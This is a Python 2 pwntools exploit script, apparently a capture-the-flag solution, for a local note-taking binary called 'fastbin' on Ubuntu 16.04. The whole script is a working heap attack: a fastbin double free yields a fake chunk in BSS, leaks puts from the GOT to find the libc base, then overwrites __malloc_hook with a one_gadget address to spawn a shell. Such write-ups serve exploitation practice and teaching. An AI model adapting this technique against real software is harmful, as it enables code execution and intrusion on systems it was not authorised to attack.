#!/usr/bin/env python2
# coding = utf-8

# Env: Ubuntu 16.04.7 LTS, GLIBC 2.23-0ubuntu11.3, Kernel 4.15.0-142-generic

from pwn import *
from LibcSearcher import *
context(arch = "amd64", os = "linux", log_level = "debug")

def note_init(name):
    p.recvuntil("what's your name:\n")
    p.send(name)
    p.recvuntil('hello, ')

def note_create(size, data):
    p.recvuntil('>')
    p.sendline('1')
    p.recvuntil('size ?')
    p.sendline(str(size))
    p.recvuntil('data:')
    p.send(data)

def note_delete(index):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('index?')
    p.sendline(str(index))

def note_print(index):
    p.recvuntil('>')
    p.sendline('3')
    p.recvuntil('index?')
    p.sendline(str(index))

p = process('./fastbin')
elf = ELF('./fastbin')
# gdb.attach(p, "")

bss_name = 0x602100
puts_got_addr = elf.got['puts'] # 0x602028

# First Stage: Leak Libc
note_init(p64(0) + p64(0x80)) # set mchunk_prev_size & mchunk_size in malloc_chunk, chunk "bss_name"
note_create(0x70, 'a') # counterfeit a double free fastbin chain
note_create(0x70, 'a')
note_delete(0)
note_delete(1)
note_delete(0) # double free chunk[0]
note_create(0x70, p64(bss_name)) # fill *(&malloc_chunk+offsetof(fd)) (usermem) ,chunk 0
note_create(0x70, 'a') # chunk 1
note_create(0x70, 'a') # chunk 0
note_create(0x70, 'a' * 0x10 + p64(puts_got_addr)) # chunk on BSS: bss_name, overwrite chunk[0] to leak got['puts']
note_print(0)
puts_libc = u64(p.recv(6) + '\x00\x00')
log.info('puts_libc:' + str(hex(puts_libc)))
libc = LibcSearcher('puts', puts_libc)
libc_base = puts_libc - libc.dump('puts')
log.info('libc_base:' + str(hex(libc_base)))

# Second Stage: Overwrite __malloc_hook to one_gadget
malloc_hook_chunk = libc_base + libc.dump('__malloc_hook') - 0x23
log.info('malloc_hook_chunk:' + str(hex(malloc_hook_chunk)))
note_create(0x60, 'a') # counterfeit a double free fastbin chain
note_create(0x60, 'a')
note_delete(6)
note_delete(7)
note_delete(6) # double free chunk[6]
note_create(0x60, p64(malloc_hook_chunk)) # chunk 6
note_create(0x60, 'a') # chunk 7
note_create(0x60, 'a') # chunk 6
one_gadget = libc_base + 0xf03a4
note_create(0x60, 'a'* 0x13 + p64(one_gadget))
note_delete(0) # two consecutive free invoke user malloc 
note_delete(0)
p.interactive()